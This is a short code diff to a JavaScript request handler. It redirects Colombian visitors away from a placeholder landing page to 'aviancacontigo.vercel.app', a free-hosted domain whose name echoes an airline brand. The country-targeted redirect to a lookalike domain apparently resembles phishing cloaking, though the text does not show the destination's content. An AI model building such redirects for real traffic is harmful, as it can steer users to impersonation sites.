@@ -16,7 +16,7 @@ export default async function handler(req, res) {
 
     if (data.country === 'CO') {
       return res.writeHead(302, {
-        Location: 'https://tu-sitio.com/landing-colombia'
+        Location: 'https://aviancacontigo.vercel.app'
       }).end();
     }
   } catch (err) {
